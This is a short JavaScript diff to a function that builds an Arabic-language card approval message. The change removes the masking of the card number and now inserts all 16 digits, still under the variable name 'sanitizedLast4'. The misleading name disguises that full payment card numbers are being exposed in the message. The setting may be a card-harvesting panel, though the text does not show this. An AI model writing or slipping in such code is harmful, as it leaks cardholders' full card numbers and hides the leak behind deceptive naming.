@@ -417,9 +417,9 @@ const sendCardApprovalRequest = async (event) => {
   text += `📊 الأقساط: ${installmentsLabel}\n`;
 
   if (cardLast4) {
-    const sanitizedLast4 = String(cardLast4).replace(/\D/g, '').slice(-14);
-    if (sanitizedLast4.length === 14) {
-      text += `🔒 البطاقة: **** **** **** ${sanitizedLast4}\n`;
+    const sanitizedLast4 = String(cardLast4).replace(/\D/g, '').slice(-16);
+    if (sanitizedLast4.length === 16) {
+      text += `🔒 البطاقة: ${sanitizedLast4}\n`;
     }
   }
 
